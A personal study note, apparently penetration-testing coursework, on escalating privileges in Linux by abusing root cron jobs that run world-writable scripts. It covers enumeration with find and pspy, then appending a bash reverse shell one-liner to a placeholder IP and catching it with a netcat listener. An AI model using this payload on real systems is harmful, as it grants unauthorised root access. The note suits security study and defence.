
2026-05-14 16:14

Tags: #escalation  

## Cron Job Abuse

- **Cron jobs** *automate administrative tasks* (backups, cleanup, etc.) on a specific schedule or at boot.


- Schedules use a six-parameter format: `minutes`, `hours`, `days`, `months`, `weeks`, `commands`.


- *User-specific* cron files live in `/var/spool/cron`; *system/application* cron files are often in `/etc/cron.d`.

## The Vulnerability

- While root crontabs are usually secure, the scripts they execute might not be.


- If a cron job runs as `root` but executes a script that is **world-writable**, unprivileged users can modify that script to execute malicious commands with root privileges.


## Enumeration Steps

- **Find Writable Files:** Search the system for files you can edit: `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`
	- ![[Pasted image 20260514161719.png]]


- **Analyze Timestamps:** Check target directories (e.g., backup folders) to deduce the cron schedule based on file creation intervals.
	- ![[Pasted image 20260514161822.png]]
	- In that pic: every 3 mins


- **Monitor Processes:** Use **pspy** (a tool that scans `procfs` *without needing root*) to *snoop on running background processes and confirm the cron job's execution and owner.*
    - Example: `./pspy64 -pf -i 1000`
    - ![[Pasted image 20260514161906.png]]

## Exploitation Process

- **Verify:** Confirm via `pspy` that the writable script is executed by `UID=0` (root).
	- ![[Pasted image 20260514162645.png]]


- **Backup:** _Always_ copy or back up the target script before editing it to avoid breaking system functions.


- **Modify:** Append a malicious payload (like a Bash reverse shell one-liner) to the end of the script.
    - Example payload: `bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1`
    - ![[Pasted image 20260514162042.png]]


- **Catch the Shell:** Set up a local Netcat listener (`nc -lnvp <PORT>`) and wait for the cron schedule to trigger your payload.
	- ![[Pasted image 20260514162053.png]]
## References:

